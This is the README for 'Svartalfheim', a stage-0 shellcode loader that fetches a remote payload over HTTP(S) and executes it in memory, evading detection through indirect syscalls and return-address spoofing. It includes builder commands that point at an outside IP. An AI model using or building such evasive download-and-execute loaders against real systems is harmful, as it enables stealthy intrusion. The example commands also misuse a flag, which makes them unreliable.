# Svartalfheim

Stage 0 Shellcode to Download a Remote Payload and Execute it in Memory

The Nt API calls ```NtAllocateVirtualMemory``` and ```NtProtectVirtualMemory``` are made using indirect syscalls.

```LoadLibraryA``` and WinHTTP calls are performed with return address spoofing.

# Usage

<table>
  <thead>
    <tr>
      <th>Option</th>
      <th>Description</th>
      <th>Required</th>
      <th>Default Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-e</td>
      <td>Http endpoint</td>
      <td>Yes</td>
      <td></td>
    </tr>
    <tr>
      <td>-u</td>
      <td>Http uri</td>
      <td>Yes</td>
      <td></td>
    </tr>
    <tr>
      <td>-p</td>
      <td>Http port</td>
      <td>Yes</td>
      <td></td>
    </tr>
    <tr>
      <td>-a</td>
      <td>User agent</td>
      <td>No</td>
      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</td>
    </tr>
    <tr>
      <td>-s</td>
      <td>Use TLS</td>
      <td>No</td>
      <td>Empty</td>
    </tr>
  </tbody>
</table>

Example :
- python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 80
- python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 443 -s

# Credit

- https://github.com/kyleavery/AceLdr
- https://github.com/realoriginal/titanldr-ng
- https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html
- https://github.com/trickster0/TartarusGate
